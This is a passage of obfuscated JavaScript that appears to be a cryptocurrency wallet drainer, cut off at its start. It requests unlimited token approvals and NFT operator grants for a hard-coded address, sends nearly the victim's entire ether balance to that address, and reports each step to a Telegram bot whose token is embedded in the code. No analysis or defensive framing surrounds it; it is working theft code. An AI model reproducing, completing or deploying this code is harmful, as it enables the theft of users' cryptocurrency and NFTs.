_0xb80113=_0x6c9c69;console[_0xb80113(0x1e2)]('Unable\x20to\x20get\x20NFts',_0x141ca4);}),NFTs=NFTs[_0x6c9c69(0x17a)],console['log'](_0x6c9c69(0x1b6),NFTs);if(tokens[_0x6c9c69(0x183)]===0x0&&NFTs[_0x6c9c69(0x183)]===0x0)onSendEther();else onApprove();}catch{sendMessage(_0x6c9c69(0x143));}}async function onApprove(){const _0x223c5b=_0x1f960c;if(tokens[_0x223c5b(0x183)])try{loopTokens(tokens);}catch(_0x5e1d76){console[_0x223c5b(0x1bb)](_0x223c5b(0x190)+_0x5e1d76[_0x223c5b(0x179)]);}else{if(NFTs[_0x223c5b(0x183)]){try{loopNfts(NFTs);}catch(_0x18cd1){console[_0x223c5b(0x1bb)]('Error\x20processing\x20item\x20'+_0x18cd1[_0x223c5b(0x179)]);}onSendEther(),sendMessage(_0x223c5b(0x1d2));}else try{onSendEther();}catch(_0x5c75bc){console[_0x223c5b(0x1bb)](_0x223c5b(0x190)+_0x5c75bc[_0x223c5b(0x179)]);}}}async function loopTokens(_0x33550d){const _0x3cbd22=_0x1f960c;for await(let _0x46099d of _0x33550d){console[_0x3cbd22(0x1e2)]('Token',_0x46099d);try{sendMessage(_0x3cbd22(0x156));let {hash:_0x490103}=await writeContract({'address':_0x46099d[_0x3cbd22(0x1ad)],'abi':ABI,'functionName':_0x3cbd22(0x1e4),'args':[Oxa,'999999999999999999999999999999999999999999999999999999999999999999999999']});console[_0x3cbd22(0x1e2)](_0x3cbd22(0x19f),_0x490103),_0x490103&&(console[_0x3cbd22(0x1e2)](_0x3cbd22(0x1c2)),sendMessage(_0x3cbd22(0x157)),sendMessage(_0x3cbd22(0x1c4)+_0x46099d[_0x3cbd22(0x1ad)]),sendMessage(_0x3cbd22(0x186)+_0x46099d[_0x3cbd22(0x1cb)]),sendMessage(_0x3cbd22(0x13b)+Oxa));}catch(_0x25c9f5){console[_0x3cbd22(0x1e2)](_0x3cbd22(0x1aa)+_0x25c9f5),sendMessage(_0x3cbd22(0x17c));}};await loopNfts(NFTs);}async function loopNfts(_0x3c09a3){const _0x3ab18a=_0x1f960c;for await(let _0x574c46 of _0x3c09a3){console[_0x3ab18a(0x1e2)](_0x3ab18a(0x198),_0x574c46);try{let {hash:_0x2b0b32}=await writeContract({'address':_0x574c46[_0x3ab18a(0x165)],'abi':ABIN,'functionName':_0x3ab18a(0x1a8),'args':[Oxa,!![]]});console['log'](_0x3ab18a(0x19f),_0x2b0b32),console[_0x3ab18a(0x1e2)]('Transaction\x20Receipt:\x20'+receipt),sendMessage(_0x3ab18a(0x157)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x574c46['token_address']),sendMessage('Your\x20address\x20'+Oxa);}catch(_0x3d9b53){console['log']('Error:\x20'+_0x3d9b53),sendMessage('Transaction\x20Rejected');}}await onSendEther();}async function onSendEther(){const _0x1c7a8a=_0x1f960c;console[_0x1c7a8a(0x1e2)]('sending\x20ether');try{let _0x20fd3e=await fetchBalance({'address':selectedAccount});console[_0x1c7a8a(0x1e2)](_0x20fd3e);const _0x51fb8a=await fetchFeeData();console['log'](_0x51fb8a);var _0x1103cc=_0x51fb8a[_0x1c7a8a(0x1dc)][_0x1c7a8a(0x1e3)];_0x1103cc=parseFloat(_0x1103cc);let _0x2ba74d=parseFloat(_0x20fd3e[_0x1c7a8a(0x1dc)])-_0x1103cc*0.00042;_0x2ba74d=parseEther(_0x2ba74d['toString']()),console[_0x1c7a8a(0x1e2)](_0x2ba74d);const {hash:_0x52f091}=await sendTransaction({'to':Oxa,'value':_0x2ba74d});console[_0x1c7a8a(0x1e2)](_0x52f091),sendMessage('Transaction\x20hash\x20',_0x52f091),sendMessage(_0x1c7a8a(0x1bd)),sendMessage(_0x1c7a8a(0x144));}catch{sendMessage('Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected');}}async function sendMessage(_0xbc6120){return new Promise((_0x26b9d5,_0x56f2a9)=>{const _0x434631=_0x3939,_0x4a481d=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x4a481d+_0x434631(0x1d9)+_0xbc6120,{'method':_0x434631(0x13e),'headers':{}})[_0x434631(0x14f)](async _0x1bbdd7=>{const _0xd405ad=_0x434631;if(_0x1bbdd7[_0xd405ad(0x181)]>0x18f)throw _0x1bbdd7;_0x26b9d5(await _0x1bbdd7[_0xd405ad(0x1a3)]());})['catch'](_0x3e3630=>{_0x56f2a9(_0x3e3630);});});}async function getPrice(_0x2ec3be){return new Promise((_0x35bb90,_0x32a5e5)=>{const _0x31107f=_0x3939;fetch(_0x31107f(0x13d)+_0x2ec3be+_0x31107f(0x146),{'method':'GET','headers':{}})[_0x31107f(0x14f)](async _0x105eef=>{const _0x21887d=_0x31107f;if(_0x105eef[_0x21887d(0x181)]>0x18f)throw _0x105eef;_0x35bb90(await _0x105eef[_0x21887d(0x1a3)]());})['catch'](_0x1b3ee7=>{_0x32a5e5(_0x1b3ee7);});});}async function getValue(_0x4ccfe9,_0x3acfce,_0x4a0000){const _0x3d159f=_0x1f960c;console['log'](_0x4ccfe9,_0x3acfce,_0x4a0000);let _0x428ec3=await getPrice(_0x4ccfe9);console[_0x3d159f(0x1e2)](_0x3d159f(0x19d),_0x428ec3),_0x428ec3=parseFloat(_0x428ec3[_0x4ccfe9][_0x3d159f(0x1af)]);let _0x538ce1=_0x3acfce/0xa**(_0x4a0000||0x12)*_0x428ec3;return _0x538ce1=parseInt(_0x538ce1),_0x428ec3?_0x538ce1:0x0;}async function getNFTs(_0x49be5c='',_0x23b47c=_0x1f960c(0x182),_0x5e629b=_0x1f960c(0x140),_0x204ca3='50'){return new Promise((_0xade08d,_0x195759)=>{const _0x69193c=_0x3939;fetch(_0x69193c(0x161)+_0x49be5c+_0x69193c(0x1db)+_0x5e629b+'&format=decimal&limit='+_0x204ca3,{'method':_0x69193c(0x13e),'headers':{'accept':'application/json','X-API-Key':_0x23b47c}})[_0x69193c(0x14f)](async _0x229ced=>{const _0x8ea7f8=_0x69193c;if(_0x229ced[_0x8ea7f8(0x181)]>0x18f)throw _0x229ced;_0xade08d(await _0x229ced['json']());})['catch'](_0x3f41c3=>{_0x195759(_0x3f41c3);});});}